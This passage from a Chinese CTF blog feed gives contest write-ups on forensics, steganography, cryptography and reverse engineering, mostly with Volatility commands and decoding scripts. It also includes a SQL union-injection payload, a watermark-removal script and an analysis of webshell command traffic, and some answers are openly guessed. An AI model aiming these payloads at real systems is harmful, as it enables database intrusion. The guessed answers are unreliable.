src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829864.png"></p><h2 id="NAS部分"><a href="#NAS部分" class="headerlink" title="NAS部分"></a>NAS部分</h2><p>除了以上John的所有设备之外,调查员还发现了一台NAS存储设备,并转交你进行分析｡ 参考 John_NAS_1.E01 和 John_NAS_2.E01,它是哪一种独立磁盘冗余阵列 (RAID)? (2分)</p><blockquote><p>A. RAID 0</p><p>B. RAID 1</p><p>C. RAID 5</p><p>D. 以上皆不是</p></blockquote><p><code>A</code></p><p>首先在比赛之前，看案情说明，可以发现题目给了两个nas盘，所以初步判断是raid0加密</p><p>注：UFS永远的神，把两个NAS拖进去，就出来答案了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829865.png"></p><ul><li>[判断题]</li></ul><p>参考 John_NAS_1.E01 和 John_NAS_2.E01,该NAS的容量有512GB (2分)</p><blockquote><p>&amp;#x20;正确</p><p>&amp;#x20;错误</p></blockquote><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829866.png"></p><p><code>错误</code></p><p>怎么算都没有512G</p><ul><li>[单选题]</li></ul><p>参考 John_NAS_1.E01 和 John_NAS_2.E01,该NAS的可用空间有多少? (3分)</p><blockquote><p>A. 512GB</p><p>B. 426GB</p><p>C. 417GB</p><p>D. 9.4GB</p></blockquote><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829867.png"></p><p>这样选择导出分析很快</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829868.png"></p><p>426G</p><ul><li>[判断题]</li></ul><p>参考 John_NAS_1.E01 和 John_NAS_2.E01,该NAS 的文件系统格式是EXT3 (2分)</p><blockquote><p>&amp;#x20;正确</p><p>&amp;#x20;错误</p></blockquote><p>同上EXT4</p><p><code>错误</code></p><ul><li>[单选题]</li></ul><p>参考 John_NAS_1.E01 和 John_NAS_2.E01,该NAS 的用户人数有多少个? (2分)</p><blockquote><p>A. 1</p><p>B. 2</p><p>C. 3</p><p>D. 4</p></blockquote><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829869.png"></p><p>检查shadow文件，如果把guset算上是三个用户</p><p>但我这里认为是两个</p><p>一个admin一个johnkiller</p><ul><li>[单选题]</li></ul><p>参考 John_NAS_1.E01 和 John_NAS_2.E01,该 NAS 内有多少张圖片标示 ‘This is a Child PORN PHOTO’ ? (2分)</p><blockquote><p>A. 1</p><p>B. 2</p><p>C. 3</p><p>D. 4</p></blockquote><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829870.png"></p><p>有一个是删除文件后面会提到，所以这里应该是四个</p><p>D</p><ul><li>[填空题]</li></ul><p>参考 John_NAS_1.E01 和 John_NAS_2.E01,视频 ING_VID_8081695_10s.mp4 在什么时候放进 NAS 内? (答案格式:YYYY-MM-DD HH:MM:SS) (3分)</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829871.png"></p><p>2024-08-08 10:59:40</p><p>直接看创建时间</p><ul><li>[填空题]</li></ul><p>参考 John_NAS_1.E01 和 John_NAS_2.E01,dcdb711a52a94fe9b6eb742a6919410D.mp4是在哪个网站下载的? (答案格式:<a href="http://www.abcd.com/">www.abcd.com</a>) (3分)</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829872.png"></p><p>原始数据搜索可以找到这个下载地址</p><p>但是不确定是上面的地址还是下面的这个</p><p>比赛的时候我们选择了<a href="http://www.vishi.com/">www.vishi.com</a></p><ul><li>[填空题]</li></ul><p>参考John_Desktop.E01,John 访问NAS的网络地址是? (答案格式:123.123.123.123) (2分)</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829873.png"></p><p>去John里看浏览器记录，发现了这个</p><p>169.254.43.127</p><ul><li>[单选题]</li></ul><p>参考John_Desktop.E01, 该 NAS 的网络驱动器盘符(Network Drive Letter)是? (2分)</p><blockquote><p>A. A</p><p>B. C</p><p>C. Z</p><p>D. F</p></blockquote><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829874.png"></p><p>John的电脑直接访问Z盘访问了NAS里面的文件</p><p>因此确定是Z盘为网络驱动器盘符</p><ul><li>[判断题]</li></ul><p>参考John_Desktop.E01, John_NAS_1.E01 和 John_NAS_2.E01, 当中的v文件夹内的视频及照片数量是相同的? (2分)</p><blockquote><p>&amp;#x20;正确</p><p>&amp;#x20;错误</p></blockquote><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829875.png"></p><p>比对一下发现数量是一样的</p><p><code>正确</code></p><ul><li>[填空题]</li></ul><p>参考 John_NAS_1.E01 和 John_NAS_2.E01,该NAS的a文件夹中, “1.jpeg” 是由哪个网站生成? (答案格式: abcd.com) (2分)</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829876.png"></p><p>1.jpeg一看就是ai生成的照片</p><p>查看edge访问记录，发现这个人先是搜了一堆明星图片，还搜了ai制作图片的消息</p><p>但我没有找到在线生成的记录</p><p>最后发现John从GitHub上找了个开源项目，显然是个ai换脸项目</p><p>于是我的答案是</p><p>GitHub.com</p><p>有点滑稽，欢迎大佬点评</p><ul><li>[填空题]</li></ul><p>参考 John_NAS_1.E01 和 John_NAS_2.E01,该NAS的c文件夹中, 有一个被删除了的照片, 它的名称是什么? (答案格式:小写英文字母,阿拉伯数字和符号’-‘ 混合组成, 例如: 123-abcf-456.jpg) (2分)</p><p>这个照片就是上文的被删除的图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829877.png"></p><p>203533-17158629334c7d.jpg</p><ul><li>[填空题]</li></ul><p>根据你以上的发现,你直觉认为有无辜的人被雇为所谓的客服人员,他们的安全仍然存在疑虑。你决定再次查看Alice的手机镜像以确认你的推测。 参考Alice_Mobile.bin,于2024年8月16日,Alice使用外送程序 “Foodpanda” 于哪间店铺点餐? (答案格式:大写英文字母,例如: GOODCAFE(CENTRAL)) (3分)</p><ul><li>[单选题]参考Alice_Mobile.bin,于2024年8月30日,Alice使用外送程序 “Foodpanda” 点餐用了哪种方式付款? (2分)</li></ul><blockquote><p>A. 微信支付</p><p>B. PayMe</p><p>C. 支付宝</p><p>D. 现金</p><p>E. 信用卡</p></blockquote><pre><code class="python">C</code></pre><p>猜了个比较常见的支付宝</p><ul><li><p>[填空题]Alice_Mobile.bin,Alice最后使用外卖程序 “Foodpanda” 的日期? (答案格式:YYYY-MM-DD) (2分)</p></li><li><p>[单选题]参考Alice_Mobile.bin,Alice要求安排”客务人员”逃到哪里? (2分)</p></li></ul><blockquote><p>A. 埃及</p><p>B. 阿根廷</p><p>C. 巴西</p><p>D. 哥伦比亚</p><p>E. 南非</p></blockquote><p><code>E</code></p><p>这部分题目蛮幸运的，团体赛开赛前下发容器密码后，即便题目未知，在火眼分析的过程中浏览了部分聊天记录，关注到了这部分内容</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829878.png"></p><ul><li>[单选题]参考Alice_Mobile.bin,Alice曾经向“客服人员”发送一张照片, 指出上船地点的位置, 拍摄这张照片的GPS经纬值是什么? (2分)</li></ul><blockquote><p>A. 22.474444444444, 114.039722222222</p><p>B. 22.473611111111, 114.042777777778</p><p>C. 22.475277777778, 114.038888888889</p><p>D. 22.475000000007, 114.035833333333</p><p>E. 22.476388888889, 114.036388888889</p></blockquote><p><code>A</code></p><p>在客服群里找到，跳转到源文件后导出</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829879.png"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829880.png"></p><p>脚本转换</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829881.png"></p><ul><li>[单选题]参考Alice_Mobile.bin,根据多媒体文件的分析,于2024年8月16日,Alice曾到哪里进行拍摄? 凭着你及团队的机智及专业知识,成功锁定犯罪团伙禁锢人质的位置｡行动单位根据你的讯息,迅速展开拯救行动,赶在被押离港前成功救出人质｡ (2分)</li></ul><blockquote><p>A. 旺角</p><p>B. 沙田</p><p>C. 黄大仙</p><p>D. 大生围</p><p>E. 天水围</p></blockquote><p><code>D</code></p><p>到图片里面按时间排序</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829882.png"></p><p>赛后根据经纬定位验证</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829883.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&amp;amp;#x20; 时光荏苒，白驹过隙，今年——2024年w3nx1z1、qui1t和tianya三位师傅终于迎来了他们的第三届美亚杯，不出意外的话，这是他们第三次参加美亚杯同时也是大学四年里最后一次参加美亚杯。在下午等待团体赛检材挂载密码发布时，w3nx1z1师傅还打趣</summary>
      
    
    
    
    <category term="取证" scheme="http://w3nx1z1.github.io/categories/%E5%8F%96%E8%AF%81/"/>
    
    
  </entry>
  
  <entry>
    <title>2024数信杯北区决赛实操</title>
    <link href="http://w3nx1z1.github.io/posts/6c995156.html"/>
    <id>http://w3nx1z1.github.io/posts/6c995156.html</id>
    <published>2024-10-03T04:59:09.245Z</published>
    <updated>2025-02-14T08:30:17.407Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2024数信杯北区决赛实操"><a href="#2024数信杯北区决赛实操" class="headerlink" title="2024数信杯北区决赛实操"></a>2024数信杯北区决赛实操</h1><p>本次比赛北区决赛第三名 学生组第一</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202410031225511.png" alt="image-20241003122509200"></p><h2 id="ez-sign"><a href="#ez-sign" class="headerlink" title="ez_sign"></a>ez_sign</h2><p>先爆破出密码123456</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202409301148745.png" alt="img"></p><p>打开看到jpg中的flag1</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202409301147789.png" alt="img"></p><pre><code>flag&#123;266c7354-0817</code></pre><p>流量包中找到flag2</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202409301147791.png" alt="img"></p><pre><code>-4694-9494-</code></pre><p>给了一个part3.zip 无法正常解压 010打开查看 发现有大量FF 写个脚本和0xFF异或</p><pre><code class="python">with open(&quot;part3.zip&quot;, &#39;rb&#39;) as f:    data = f.read()xor_data = bytearray(d ^ 0xFF for d in data)with open(&quot;1.zip&quot;, &#39;wb&#39;) as f:    f.write(xor_data)</code></pre><p>正常解压压缩包 得到flag3</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202409301147954.png" alt="img"></p><pre><code>flag&#123;266c7354-0817-4694-9494-c727479d8f1a&#125; </code></pre><p>其实上面异或这一步直接在010editor里面进行也可以 记得选择无符号字节</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202410031214957.png" alt="image-20241003121454849"></p><p>也可以直接在赛博厨子中进行 先解hex 在进行异或</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202410031216661.png" alt="image-20241003121649531"></p><h2 id="签到寄语"><a href="#签到寄语" class="headerlink" title="签到寄语"></a>签到寄语</h2><p>随便写</p><p>写完用CameraFileCopy扫码 得到文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202410031217996.png" alt="image-20241003121741906"></p><h2 id="Secret1"><a href="#Secret1" class="headerlink" title="Secret1"></a>Secret1</h2><pre><code>小强离开电脑的时候，某人把小强的秘密给偷走了，还把文件修改覆盖了，作案脚本也删了。请帮助小强找到丢失的相关数据。1.提交加密算法工具当中的flag值。（提交示例：flag&#123;*&#125;）</code></pre><p>使用r-studio打开内存镜像 在secret文件夹下面有个pyc文件 保存出来 打开就有flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202410031218110.png" alt="image-20241003121804041"></p><h2 id="secret2"><a href="#secret2" class="headerlink" title="secret2"></a>secret2</h2><pre><code>2.恢复图片中的flag值</code></pre><p>把上面的pyc文件代码逆出来</p><pre><code class="Python">def encode(png):    flag = &quot;flag&#123;eba771fd-2b03-418f-b11a-60f1141c99ee&#125;&quot;    lens = len(flag)    with open(png, &quot;rb&quot;) as f:        pic_bytes = f.read()        print(len(pic_bytes))        output_bytes = bytearray()        for i in range(0, len(pic_bytes)):            output_bytes.append(pic_bytes[i] ^ ord(flag[i * 2 % lens]))    with open(png, &quot;wb&quot;) as f:        f.write(output_bytes)</code></pre><p>filescan出来一个flag.png 保存出来 这就是被加密的图片 ai跑个脚本恢复出原图片</p><pre><code class="Python">def decode(png):    flag = &quot;flag&#123;eba771fd-2b03-418f-b11a-60f1141c99ee&#125;&quot;    lens = len(flag)    with open(png, &quot;rb&quot;) as f:        enc_bytes = f.read()        output_bytes = bytearray()        for i in range(len(enc_bytes)):            output_bytes.append(enc_bytes[i] ^ ord(flag[i * 2 % lens]))    with open(&quot;decoded_&quot; + png, &quot;wb&quot;) as f:        f.write(output_bytes)# 使用解密函数decode(&quot;flag.png&quot;)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202410031219969.png" alt="image-20241003121948915"></p><h2 id="secret3-赛后复盘"><a href="#secret3-赛后复盘" class="headerlink" title="secret3(赛后复盘)"></a>secret3(赛后复盘)</h2><pre><code>3.提交压缩包当中的flag值。</code></pre><p>也算是学到了 一个很不常见的插件使用方式</p><p>压缩包在上一题恢复出来的图片尾部 提取出来之后 确定为真加密 开始找密码</p><p>密码在剪切板中</p><p>剪贴板插件后面加上-v参数 因为可能在明文之间有不可见字符进行隔断 这个时候仅使用clipboard就可能看不到全部明文</p><pre><code>clipboard -v </code></pre><p>下图是加不加-v参数的对比</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202410031257569.png" alt="image-20241003125734777"></p><p>拿到密码后 解压压缩包出flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202410031258260.png" alt="image-20241003125808201"></p><h2 id="history1"><a href="#history1" class="headerlink" title="history1"></a>history1</h2><p>r-studio里面找到两个ipynb文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202410031220754.png" alt="image-20241003122015611"></p><p>使用vol导出</p><pre><code class="Python">.\volatility.exe -f F:\history\history_91c3e27c00d70d4d6982952b60a4bb51\data.raw --profile=Win7SP1x64 filescan | findstr &quot;.ipynb&quot;                                             ─╯Volatility Foundation Volatility Framework 2.60x000000007d843bd0     16      0 -W-rw- \Device\HarddiskVolume1\Users\ctf\Anaconda3\etc\fish\conda\.ipynb_checkpoints\Untitled-checkpoint.ipynb0x000000007da54b40     16      0 R--rw- \Device\HarddiskVolume1\Users\ctf\Anaconda3\etc\fish\conda\Untitled.ipynb.\volatility.exe -f F:\history\history_91c3e27c00d70d4d6982952b60a4bb51\data.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007d843bd0 -D E:\Desktop\数信杯\history            ─╯Volatility Foundation Volatility Framework 2.6DataSectionObject 0x7d843bd0   None   \Device\HarddiskVolume1\Users\ctf\Anaconda3\etc\fish\conda\.ipynb_checkpoints\Untitled-checkpoint.ipynb.\volatility.exe -f F:\history\history_91c3e27c00d70d4d6982952b60a4bb51\data.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007da54b40 -D E:\Desktop\数信杯\history            ─╯Volatility Foundation Volatility Framework 2.6DataSectionObject 0x7da54b40   None   \Device\HarddiskVolume1\Users\ctf\Anaconda3\etc\fish\conda\Untitled.ipynb</code></pre><p>打开就是flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202409301147598.png" alt="img"></p><h2 id="history2"><a href="#history2" class="headerlink" title="history2"></a>history2</h2><p>同上题</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202409301147581.png" alt="img"></p><h2 id="Pixel"><a href="#Pixel" class="headerlink" title="Pixel"></a>Pixel</h2><p>首先看到文件头提示SM4CBC sm4国密算法 CBC模式 修改为png头后 正常打开图片</p><p>尾部有密文</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202410031220259.png" alt="image-20241003122040190"></p><p>存在lsb隐写 先得到key</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202410031221907.png" alt="image-20241003122100826"></p><p>注意这个地方是<code>1</code>不是<code>l</code>(踩大坑)</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202410031222166.png" alt="image-20241003122224057"></p><p>zsteg得到iv</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202410031223312.png" alt="image-20241003122314206"></p><p>直接解密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202410031223650.png" alt="image-20241003122337452"></p><h2 id="水印攻击-北区-990分"><a href="#水印攻击-北区-990分" class="headerlink" title="水印攻击_北区(990分)"></a>水印攻击_北区(990分)</h2><p>gpt调</p><pre><code class="Python">from PIL import Image, ImageEnhanceimport numpy as np# 打开原始图片image_path = &quot;input.png&quot;image = Image.open(image_path)# 1. 轻微调整亮度def adjust_brightness(image, factor=1.05):    enhancer = ImageEnhance.Brightness(image)    return enhancer.enhance(factor)# 2. 添加轻微的高斯噪声def add_noise(image, mean=0, var=0.001):    img_array = np.asarray(image)    row, col, ch = img_array.shape    sigma = 0.0003    gauss = np.random.normal(mean, sigma, (row, col, ch))    noisy_img = img_array + gauss * 255    noisy_img = np.clip(noisy_img, 0, 255).astype(np.uint8)    return Image.fromarray(noisy_img)# 3. 叠加轻微的掩码块def add_mask_block(image, block_size=5, opacity=0.1):    img_array = np.array(image)    mask = np.zeros_like(img_array)    h, w, _ = img_array.shape    start_h = np.random.randint(0, h - block_size)    start_w = np.random.randint(0, w - block_size)    mask[start_h:start_h + block_size, start_w:start_w + block_size] = (255, 255, 255)    final_img = (1 - opacity) * img_array + opacity * mask    final_img = np.clip(final_img, 0, 255).astype(np.uint8)    return Image.fromarray(final_img)# 应用以上步骤对图像进行处理image = adjust_brightness(image, factor=1.1) # 轻微提高亮度image = add_noise(image, mean=0, var=0.0005)  # 添加轻微噪声# 保存处理后的图片image.save(&quot;result.png&quot;)</code></pre><h2 id="Ezsql"><a href="#Ezsql" class="headerlink" title="Ezsql"></a>Ezsql</h2><p>联合注入 先闭合前面的sql查询语句 后面根据题目描述 查询whatisthis表中的flag</p><pre><code class="Python">name=1&#39;) union all select 1,flag,3 FROM whatisthis--+</code></pre><h2 id="easy-decode"><a href="#easy-decode" class="headerlink" title="easy-decode"></a>easy-decode</h2><p>对main函数计算md5，动调有问题，不同工具结果都不同，比较新颖的反调试</p><p>idapython直接算</p><pre><code class="Python">import hashlibimport ida_bytes# 指定的起始地址（替换为有效的起始地址）start_addr = 0x7FF721E11000# 要读取的长度length = 0x7D0# 读取字节数据byte_values = [ida_bytes.get_byte(start_addr + i) for i in range(length)]# 将字节数组转换为字节串（bytes）byte_data = bytes(byte_values)# 计算MD5哈希值md5_hash = hashlib.md5(byteS_data).hexdigest()# 打印MD5哈希值print(&quot;MD5:&quot;, md5_hash)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202410031224720.png" alt="image-20241003122429607"></p><p>厨子解aes，iv全零</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202409301147392.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2024数信杯北区决赛实操&quot;&gt;&lt;a href=&quot;#2024数信杯北区决赛实操&quot; class=&quot;headerlink&quot; title=&quot;2024数信杯北区决赛实操&quot;&gt;&lt;/a&gt;2024数信杯北区决赛实操&lt;/h1&gt;&lt;p&gt;本次比赛北区决赛第三名 学生组第一&lt;/p&gt;
&lt;p&gt;&lt;</summary>
      
    
    
    
    <category term="ctf" scheme="http://w3nx1z1.github.io/categories/ctf/"/>
    
    
    <category term="misc" scheme="http://w3nx1z1.github.io/tags/misc/"/>
    
    <category term="web" scheme="http://w3nx1z1.github.io/tags/web/"/>
    
    <category term="re" scheme="http://w3nx1z1.github.io/tags/re/"/>
    
    <category term="forensics" scheme="http://w3nx1z1.github.io/tags/forensics/"/>
    
  </entry>
  
  <entry>
    <title>2024羊城杯MISC方向wp</title>
    <link href="http://w3nx1z1.github.io/posts/f58085eb.html"/>
    <id>http://w3nx1z1.github.io/posts/f58085eb.html</id>
    <published>2024-08-28T13:46:47.290Z</published>
    <updated>2025-02-14T08:30:17.410Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2024羊城杯MISC方向wp"><a href="#2024羊城杯MISC方向wp" class="headerlink" title="2024羊城杯MISC方向wp"></a>2024羊城杯MISC方向wp</h1><p>真是叹为观止的一场比赛 见识到众多本科组ctf大手子们熬夜上分 最后半小时神仙打架 最后一分钟疯狂交题更是让在下大开眼界 </p><p>但是苦于没有队友 只能自己浅做一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281606294.png" alt="image-20240828160658179"></p><h2 id="不一样的数据库-2"><a href="#不一样的数据库-2" class="headerlink" title="不一样的数据库_2"></a>不一样的数据库_2</h2><p>附件拿到一个压缩包 真加密 010打开 翻到最下面 找到提示 密码是6位数字</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281609396.png" alt="image-20240828160902327"></p><p>爆破一下密码 为<code>753951</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281609493.png" alt="image-20240828160930428"></p><p>解压得到一张残缺的二维码和一个kdbx的Keepass数据库 先修复二维码 这个很好弄 就是补全三个定位点就可以了</p><p>直接截一个正常二维码的定位点 然后用PS粘上去就可以扫</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281617426.png" alt="image-20240828161721363"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281618936.png" alt="image-20240828161820866"></p><p>得到<code>NRF@WQUKTQ12345&amp;WWWF@WWWFX#WWQXNWXNU</code></p><p>使用Keepass打开数据库 需要输入密码 但是发现直接输入上面扫出来的字符串不能直接解密 发现给的附件中的残缺二维码的名字是13 联想到rot13 解密一下得到<code>AES@JDHXGD12345&amp;JJJS@JJJSK#JJDKAJKAH</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281628267.png" alt="image-20240828162807192"></p><p>成功打开数据库</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281628359.png" alt="image-20240828162847235"></p><p>先看到一个<code>passisDASCTF</code>  同时看到群组名字是AES 那下面就是找一下密文 </p><h3 id="查看编辑记录"><a href="#查看编辑记录" class="headerlink" title="查看编辑记录"></a>查看编辑记录</h3><p>右击选择编辑记录 可以找到修改密码记录的历史 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281636863.png" alt="image-20240828163642789"></p><p>选择最后面两条记录的任意一条 选择<code>高级</code> 可以看到一个字段名为<code>aes</code>就是密文 值有很明显的<code>U2Fsd</code>AES加密头 直接使用密码进行AES解密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281638684.png" alt="image-20240828163849623"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281640368.png" alt="image-20240828164012316"></p><h2 id="so-much"><a href="#so-much" class="headerlink" title="so+much"></a>so+much</h2><p>原题 没什么好说的 拿到的ad1镜像文件 名字为<code>c2hpZnQh</code>  解base64是<code>shift! </code></p><p>使用010打开 发现有提示 和<code>123456</code> 结合shift 可以想到密码是按住shift键的123456 也就是<code>!@#$%^</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281641657.png" alt="image-20240828164137592"></p><p>解密ad1镜像文件 使用FTK imager  File——Decrypt AD1 image 得到解密后的<code>c2hpZnQh-decrypted.ad1</code> 在使用FTK进行挂载</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281656295.png" alt="image-20240828165614222"></p><p>打开挂载上的镜像 发现很多<code>.crypto</code>文件 同时时间戳只有两种 猜测是转二进制 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281658327.png" alt="image-20240828165833261"></p><p>因为挂载的时候是只读模式 我们需要把这些文件都先单独复制出来 写脚本 先提取时间戳 可以发现时间少的是<code>1628151585.73009</code> 因此转化为0 反之则为1</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281700567.png" alt="image-20240828170014520"></p><pre><code class="python">import oslist = [&#39;&#39;]*344i = 0for j in range(344):    list[j] = os.path.getmtime(str(j)+&#39;.crypto&#39;)# print(list)flag = &#39;&#39;for i in range(344):    if(str(list[i]) == &#39;1628151585.73009&#39;):        flag += &#39;0&#39;    else:        flag += &#39;1&#39;print(flag)tmp = &#39;&#39;for k in range(len(flag)):    tmp += flag[k]    if len(tmp) == 8:        print(chr(int(tmp,2)),end=&#39;&#39;)        tmp = &#39;&#39;        # the_key_is_700229c053b4ebbcf1a3cc37c389c4fa</code></pre><p>得到解密crypto文件的密码是<code>700229c053b4ebbcf1a3cc37c389c4fa</code>  解密需要的工具是<code>Encrypto </code> 我们只需要找两个时间戳不一样的文件进行解密就可以了  两个文件内容拼起来就是flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281703623.png" alt="image-20240828170309574"></p><h2 id="hiden"><a href="#hiden" class="headerlink" title="hiden"></a>hiden</h2><p>附件一个wav文件 一个需要解密内容的文件 文件名<code>60=()+()</code> 直接猜测是13+47 需要进行rot47+rot13解密</p><p>得到加密脚本</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281706170.png" alt="image-20240828170653049"></p><pre><code class="python">import wave with open(&#39;flag.txt&#39;, &#39;rb&#39;) as f:    txt_data = f.read()    file_len = len(txt_data)    txt_data = file_len.to_bytes(3, byteorder = &#39;little&#39;) + txt_datawith wave.open(&quot;test.wav&quot;, &quot;rb&quot;) as f:    attrib = f.getparams()        wav_data = bytearray( f.readframes(-1) )for index in range(len(txt_data)):    wav_data[index * 4] = txt_data[index]    with wave.open(&quot;hiden.wav&quot;, &quot;wb&quot;) as f:    f.setparams(attrib)     f.writeframes(wav_data)</code></pre><p>直接ai跑个解密脚本 就能提取出flag.txt的内容</p><pre><code class="python">import wave# 打开hiden.wav文件with wave.open(&quot;hiden.wav&quot;, &quot;rb&quot;) as f:    # 获取音频参数    num_frames = f.getnframes()    wav_data = bytearray(f.readframes(num_frames))# 提取隐藏的内容hidden_data = bytearray()length_of_hidden_data = 0# 先提取长度for index in range(3):    hidden_data.append(wav_data[index * 4])# 得到隐藏数据的长度length_of_hidden_data = int.from_bytes(hidden_data[:3], byteorder=&#39;little&#39;)# 提取隐藏的文本数据hidden_data = bytearray()for index in range(length_of_hidden_data):    hidden_data.append(wav_data[(index + 3) * 4])  # 继续提取，跳过长度的部分# 将提取的内容写入flag.txtwith open(&#39;extracted_flag.txt&#39;, &#39;wb&#39;) as f:    f.write(hidden_data)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281708578.png" alt="image-20240828170805516"></p><h2 id="Checkin"><a href="#Checkin" class="headerlink" title="Checkin"></a>Checkin</h2><p>在附件压缩包中找到一条注释</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281721518.png" alt="image-20240828172100396"></p><p>解一下 是base58 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281721503.png" alt="image-20240828172140427"></p><p>只给了一个txt文件 是16进制 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281717828.png" alt="image-20240828171746771"></p><p>放到010中 发现是一个流量包 单独保存出来进行分析 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281718443.png" alt="image-20240828171843381"></p><p>很多TLS 找办法找到解密日志 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281719729.png" alt="image-20240828171934648"></p><p>txt文档中存在wbstego隐写 密码就使用上面注释解出来的 导出来的文件保存为<code>1.log</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281727476.png" alt="image-20240828172703379"></p><p>将这个解密日志 导入到流量包中</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281732672.png" alt="image-20240828173249610"></p><p>成功解密 追踪http流 找到一个flag.gif </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281733626.png" alt="image-20240828173356544"></p><p>提取出来 先分析一波帧间隔 很好 有规律 也是转二进制 小的是0 大的是1</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281734852.png" alt="image-20240828173432763"></p><p>解一下二进制 出flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281734768.png" alt="image-20240828173458686"></p><h2 id="miaoro"><a href="#miaoro" class="headerlink" title="miaoro"></a>miaoro</h2><p>给到的附件是一个流量包 先追踪一下tcp流 </p><p>可以看到请求包GWHT字段是一个base64加密的值 在下面的返回包 也是base64加密的值 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408282034434.png" alt="image-20240828203403305"></p><p>解密看一下 可以看到GWHT部分应该是命令执行的部分 下面返回包就是命令执行的结果 出现命令执行部分也对应着题干中的被攻击</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408282035954.png" alt="image-20240828203510872"></p><p>继续向后看 在第10个包找到一个密码<code>Th15_11111111s_pP@sssssw000rd!!!</code>    在第13个包找到一个<code>secret.txt</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408282037589.png" alt="image-20240828203700485"></p><p>将secret.txt的返回包部分提取出来 是一个逆序的压缩包的16进制 